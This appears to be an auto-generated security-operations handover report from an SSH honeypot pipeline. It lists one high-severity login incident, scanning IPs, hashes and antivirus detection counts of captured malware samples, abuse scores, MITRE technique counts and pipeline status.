### 🔴 HIGH · IR-c3fa6d31ccbe

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-26 09:05 |
| **Last Seen** | 2026-04-26 09:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:05:32` | `cowrie.session.connect` |
| `2026-04-26 09:05:32` | `cowrie.client.version` |
| `2026-04-26 09:05:33` | `cowrie.client.kex` |
| `2026-04-26 09:05:33` | `cowrie.login.success` |
| `2026-04-26 09:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.199.16[.]90` | **27** | 2026-04-26 06:09 | 2026-04-26 06:45 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `114.220.238[.]30` | **27** | 2026-04-26 08:36 | 2026-04-26 09:05 | 46m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `157.66.34[.]121` | **27** | 2026-04-26 06:12 | 2026-04-26 06:52 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.138.124[.]41` | **18** | 2026-04-26 06:18 | 2026-04-26 06:19 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.206.32[.]4` | **14** | 2026-04-26 08:36 | 2026-04-26 09:05 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `16.58.56[.]214` | **7** | 2026-04-26 08:45 | 2026-04-26 08:52 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `101.36.107[.]152` | **5** | 2026-04-26 06:10 | 2026-04-26 07:15 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `118.145.164[.]82` | **4** | 2026-04-26 07:52 | 2026-04-26 07:54 | 4m | 0 | `T1592` | 🟢 LOW |
| `3.132.26[.]232` | **4** | 2026-04-26 07:10 | 2026-04-26 07:12 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `122.169.35[.]19` | **3** | 2026-04-26 08:10 | 2026-04-26 08:12 | 2m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `172.236.228[.]220` | **3** | 2026-04-26 07:33 | 2026-04-26 07:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]245` | **3** | 2026-04-26 08:33 | 2026-04-26 08:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | **2** | 2026-04-26 06:32 | 2026-04-26 07:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]129` | **2** | 2026-04-26 07:37 | 2026-04-26 07:37 | 2m | 0 | `T1592` | 🟢 LOW |
| `103.149.27[.]208` | 1 | 2026-04-26 08:34 | 2026-04-26 08:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.14.124[.]92` | 1 | 2026-04-26 08:54 | 2026-04-26 08:54 | 30s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-04-26 07:26 | 2026-04-26 07:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.208.62[.]162` | 1 | 2026-04-26 09:05 | 2026-04-26 09:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-04-26 08:33 | 2026-04-26 08:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.239.79[.]158` | 1 | 2026-04-26 07:04 | 2026-04-26 07:04 | 30s | 0 | `T1592` | 🟢 LOW |
| `78.94.226[.]221` | 1 | 2026-04-26 06:26 | 2026-04-26 06:27 | 30s | 0 | `T1592` | 🟢 LOW |
| `91.237.114[.]170` | 1 | 2026-04-26 08:28 | 2026-04-26 08:28 | 19s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-04-26 07:53 | 2026-04-26 07:53 | 0s | 3 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `130.12.180[.]174` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `106.14.124[.]92` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 6 |
| `45.33.109[.]18` | US | Linode | **100** ⚠️ | 50 |
| `172.206.32[.]4` | US | Microsoft Limited | **100** ⚠️ | 7 |
| `91.237.114[.]170` | UA | Kachanovskiy Sergey Sergeevich | **100** ⚠️ | 33 |
| `118.145.164[.]82` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 12 |
| `172.208.62[.]162` | US | Microsoft Limited | **100** ⚠️ | 6 |
| `103.199.16[.]90` | VN | GREENCLOUD LIMITED LIABILITY COMPAN | **100** ⚠️ | 38 |
| `172.236.228[.]245` | US | Linode | **100** ⚠️ | 50 |
| `157.66.34[.]121` | ID | PT Eniware Newclear Indonesia | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 231 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 125 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 74 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 34 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 34 |

---

## 🔕 False Positive Summary (78 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 43 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 29 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 295 cases |
| Tool 34  | Credential Extractor        | ✅ 209 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 37 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 78 filtered (26.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 62 priority case(s) shown individually · 23 recon entry/entries in table (14 group(s) consolidating 146 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-26T09:06:46Z_
